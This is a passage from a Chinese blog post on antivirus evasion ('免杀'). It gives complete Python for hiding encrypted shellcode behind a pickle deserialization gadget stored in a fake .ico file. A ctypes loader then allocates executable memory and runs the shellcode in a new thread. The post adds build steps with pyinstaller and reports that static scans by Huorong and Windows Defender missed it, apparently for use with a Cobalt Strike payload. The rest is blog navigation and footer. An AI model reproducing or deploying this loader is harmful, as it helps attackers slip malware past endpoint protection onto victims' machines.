class="comment">#print(&#x27;加密完成,加密后的文件为Encrypt_shellcode.txt,加密key=&#123;&#125;&#x27;.format(key))</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EncryptICO</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        key = Fernet.generate_key()</span><br><span class="line">        f = Fernet(key)</span><br><span class="line">        enc_pay = f.encrypt(<span class="built_in">bytes</span>(<span class="built_in">bytearray</span>(file.read())))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Encrypt_test.ico&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(enc_pay.decode())</span><br><span class="line">        <span class="comment">#print(&#x27;加密完成,加密后的文件为Encrypt_test.ico,加密key=&#123;&#125;&#x27;, format(key))</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="PickleDump-py-1"><a href="#PickleDump-py-1" class="headerlink" title="PickleDump.py"></a>PickleDump.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> encrypt <span class="keyword">import</span> EncryptTXT,EncryptICO</span><br><span class="line"></span><br><span class="line">key = EncryptTXT(<span class="string">&#x27;shellcode.txt&#x27;</span>)</span><br><span class="line">shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import ctypes</span></span><br><span class="line"><span class="string">from cryptography.fernet import Fernet</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">f= open(&#x27;Encrypt_shellcode.txt&#x27;, &#x27;rb&#x27;)</span></span><br><span class="line"><span class="string">shellcode= f.read()</span></span><br><span class="line"><span class="string">key= &#123;0&#125;</span></span><br><span class="line"><span class="string">f_obj= Fernet(key)</span></span><br><span class="line"><span class="string">shellcode= f_obj.decrypt(shellcode)</span></span><br><span class="line"><span class="string">shellcode= bytearray(shellcode)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.VirtualAlloc.restype= ctypes.c_uint64</span></span><br><span class="line"><span class="string">ptr= ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40))</span></span><br><span class="line"><span class="string">buf= (ctypes.c_char *len(shellcode)).from_buffer(shellcode)</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.RtlMoveMemory(</span></span><br><span class="line"><span class="string">   ctypes.c_uint64(ptr),</span></span><br><span class="line"><span class="string">   buf,</span></span><br><span class="line"><span class="string">   ctypes.c_int(len(shellcode))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">handle= ctypes.windll.kernel32.CreateThread(</span></span><br><span class="line"><span class="string">   ctypes.c_int(0),</span></span><br><span class="line"><span class="string">   ctypes.c_int(0),</span></span><br><span class="line"><span class="string">   ctypes.c_uint64(ptr),</span></span><br><span class="line"><span class="string">   ctypes.c_int(0),</span></span><br><span class="line"><span class="string">   ctypes.c_int(0),</span></span><br><span class="line"><span class="string">   ctypes.pointer(ctypes.c_int(0))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span>(<span class="built_in">exec</span>,(shellcode,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ret = pickle.dumps(A())</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.ico&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> img:</span><br><span class="line">        img.write(ret)</span><br><span class="line">    key = EncryptICO(<span class="string">&#x27;test.ico&#x27;</span>) <span class="comment">#对test.ico</span></span><br><span class="line">    <span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="PickleLoad-py-1"><a href="#PickleLoad-py-1" class="headerlink" title="PickleLoad.py"></a>PickleLoad.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"></span><br><span class="line">temp=<span class="built_in">open</span>(<span class="string">&quot;Encrypt_test.ico&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">key = <span class="string">b&#x27;2cAx5afBvED2B7vanLMy8TvRT3hG6uIJukWD9nu56Yk=&#x27;</span></span><br><span class="line">f_obj=Fernet(key)</span><br><span class="line">temp=f_obj.decrypt(temp)</span><br><span class="line">shellcode=pickle.loads(temp)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="项目运行"><a href="#项目运行" class="headerlink" title="项目运行"></a>项目运行</h2><p>首先运行<code>GenerateShellcode.py</code>生成shellcode.txt</p>
+<p>随后运行<code>PickleDump.py</code>生成test.ico, 并对shellcode.txt和test.ico进行加密, 加密后的文件为<code>Encrypt_shellcode.txt</code>和<code>Encrypt_test.ico</code>, 此时注意控制台输出的key值为<code>b&#39;2cAx5afBvED2B7vanLMy8TvRT3hG6uIJukWD9nu56Yk=&#39;</code>(PickleLoad.py会用到)</p>
+<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221120224944318.png" alt="image-20221120224944318"></p>
+<p>打开<code>PickleLoad.py</code>, 将key值替换成上述生成的key值</p>
+<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221120225157291.png" alt="image-20221120225157291"></p>
+<p>使用pyinstall命令打包<code>PickleLoad.py</code>为可执行文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstall.exe PickleLoad.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221120230017265.png" alt="image-20221120230017265"></p>
+<p>最后三位一体的免杀文件分别是<code>Encrypt_shellcode.txt</code>、<code>Encrypt_test.ico</code>、<code>PickleLoad.exe</code></p>
+<p><img src="Python反序列化免杀/image-20221120230223822.png" alt="image-20221120230223822" style="zoom:67%;" />&#96;</p>
+<p>使用火绒和WindowsDefender扫描均未报毒</p>
+<img src="Python反序列化免杀/image-20221120230924043.png" alt="image-20221120230924043" style="zoom:67%;" />					
+
+<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221120231145422.png" alt="image-20221120231145422">	</p>
+<p>但是运行的时候会被WindowsDefender拦截掉, 个人猜测可能是CobaltStrike流量被检测到了, 后续还需对CS流量进行隐藏或加密</p>
+<p><img src="/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/image-20221120231351854.png" alt="image-20221120231351854">	</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WOBQFbrEgylNhBAwlT9JnQ">https://mp.weixin.qq.com/s/WOBQFbrEgylNhBAwlT9JnQ</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAwMjc0NTEzMw==&mid=2653579519&idx=1&sn=e6d31f52ea46d141e817e6ca4043c50c&chksm=811b7ebdb66cf7ab0a542c58ebaac8b526a650c565caa5a3754f17c9f00089d2d08b9e32f68a&scene=126&sessionid=1660184540&key=41ff146e600b77a0d04399ad7126a7870762dbcc55e2fc1dcb7890570b7ebb183da39306b60480a6de984d71fb0881334eb9ed7714d8b475a61c6ad0efcc3f2e1d8c2de2738842a5d6767bf21a5674b6e0951ea5e41b54fe509639e775f757d1bd73871e619b776d0663a1eeebe4dad6f09f6dd4de293976f8d9529dcdc7a68f&ascene=15&uin=MTA3Mzc3OTIzNQ==&devicetype=Windows+10+x64&version=6307051f&lang=zh_CN&session_us=gh_ceb74c1acd23&exportkey=ARaPcaF8+3anRpPJRj8hRS8=&acctmode=0&pass_ticket=tLi1BnMh8wn6/SHfWt0wXfhUW0X59t7KFmIx2QsYk6UEAG3Ra+o9emrqh/Iyrr11&wx_header=0&fontgear=2">https://mp.weixin.qq.com/s?__biz=MzAwMjc0NTEzMw==&amp;mid=2653579519&amp;idx=1&amp;sn=e6d31f52ea46d141e817e6ca4043c50c&amp;chksm=811b7ebdb66cf7ab0a542c58ebaac8b526a650c565caa5a3754f17c9f00089d2d08b9e32f68a&amp;scene=126&amp;sessionid=1660184540&amp;key=41ff146e600b77a0d04399ad7126a7870762dbcc55e2fc1dcb7890570b7ebb183da39306b60480a6de984d71fb0881334eb9ed7714d8b475a61c6ad0efcc3f2e1d8c2de2738842a5d6767bf21a5674b6e0951ea5e41b54fe509639e775f757d1bd73871e619b776d0663a1eeebe4dad6f09f6dd4de293976f8d9529dcdc7a68f&amp;ascene=15&amp;uin=MTA3Mzc3OTIzNQ%3D%3D&amp;devicetype=Windows+10+x64&amp;version=6307051f&amp;lang=zh_CN&amp;session_us=gh_ceb74c1acd23&amp;exportkey=ARaPcaF8%2B3anRpPJRj8hRS8%3D&amp;acctmode=0&amp;pass_ticket=tLi1BnMh8wn6%2FSHfWt0wXfhUW0X59t7KFmIx2QsYk6UEAG3Ra%2Bo9emrqh%2FIyrr11&amp;wx_header=0&amp;fontgear=2</a></p>
+</li>
+</ul>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2023/10/22/%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0/AntiAntiVirusNotes-master/session0%E6%B3%A8%E5%85%A5/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">(no title)</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
+    </div>
+  </article>
+</div>
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2023/10/22/%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0/AntiAntiVirusNotes-master/Powershell%E5%85%8D%E6%9D%80/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">(no title)</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="https://s.gravatar.com/avatar/2d6b803eea37de0257620d5fabee7e64?s=200&amp;r=g&amp;d=retro" class="soft-size--round soft-style--box" alt="Sukoshi">
+    
+    
+      <h2>Sukoshi</h2>
+    
+    
+      <p>贵在坚持</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>42</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        0
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        3
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>flex-block主题部分重构，详情查看https://github.com/miiiku/flex-block</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/tags/Hexo/" style="font-size: 10px;" class="tags-cloud-0">Hexo</a> <a href="/tags/Markdown/" style="font-size: 10px;" class="tags-cloud-0">Markdown</a> <a href="/tags/%E7%BD%91%E7%AB%99/" style="font-size: 10px;" class="tags-cloud-0">网站</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/miiiku/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+          <a href="https://twitter.com/guanquanhong" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
+</svg>
+          </a>
+        
+      
+    </div>
+     
+    <p>&copy; 2023 <a href="/" target="_blank">John Doe</a></p>
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+<!-- copy button  -->
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+<!-- https://clipboardjs.com/ -->
+
+
+<script type="text/javascript">
+	(function () {
+		function getCodeType (elem) {
+			const classs = Array.from(elem.classList.values());
+			if (classs && classs.length > 1) {
+				return classs[1];
+			}
+			return "plain";
+		}
+
+		window.addEventListener("DOMContentLoaded", () => {
+			const copyBtnClass = "copy-btn";
+			//  instantiate clipboardjs 
+			const clipboard = new ClipboardJS('.' + copyBtnClass);
+
+			clipboard.on('success', function (e) {
+				console.info('Action:', e.action);
+				console.info('Text:', e.text);
+				console.info('Trigger:', e.trigger);
+				if (e.trigger) {
+					e.trigger.classList.add("copied");
+					setTimeout(() => {
+						e.trigger.classList.remove("copied");
+					}, 3000);
+				}
+				e.clearSelection();
+			});
+
+			clipboard.on('error', function (e) {
+				console.error('Action:', e.action);
+				console.error('Trigger:', e.trigger);
+			});
+
+			document.querySelectorAll('figure.highlight').forEach((elem) => {
+				const codeContent = elem.querySelector("td.code");
+				const copyButton = document.createElement('button');
+				copyButton.setAttribute("class", copyBtnClass);
+				copyButton.setAttribute("title", "Copy Code");
+				copyButton.setAttribute("data-clipboard-text", codeContent.innerText);
+				elem.insertBefore(copyButton, elem.children[0]);
+			});
+		})
+	})();
+</script>
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
